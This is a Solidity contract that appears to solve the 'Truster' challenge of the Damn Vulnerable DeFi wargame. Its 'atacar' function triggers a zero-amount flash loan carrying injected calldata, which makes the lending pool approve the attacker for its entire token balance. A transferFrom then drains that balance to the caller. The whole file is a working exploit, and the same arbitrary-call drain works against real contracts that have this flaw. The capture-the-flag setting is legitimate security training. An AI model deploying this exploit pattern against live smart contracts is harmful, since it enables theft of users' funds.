// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
interface TrusterLenderPool2 {
  function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract AttackerTrusterLenderPool {

    IERC20 public immutable damnValuableToken;
    TrusterLenderPool2 public contractToAttack;
    address public contratoSolo;

    constructor (address tokenAddress, address lenderPool) {
        damnValuableToken = IERC20(tokenAddress);
        contractToAttack = TrusterLenderPool2(lenderPool);
        contratoSolo = lenderPool;
    }

    function atacar(address target) public {
      uint256 balanceARobar = damnValuableToken.balanceOf(contratoSolo);
      bytes memory attackData = abi.encodeWithSignature('approve(address,uint256)',address(this),balanceARobar);
      contractToAttack.flashLoan(0, msg.sender, target, attackData);
      bool valor = damnValuableToken.transferFrom(contratoSolo, msg.sender, balanceARobar);
      console.log(valor);
    }


}
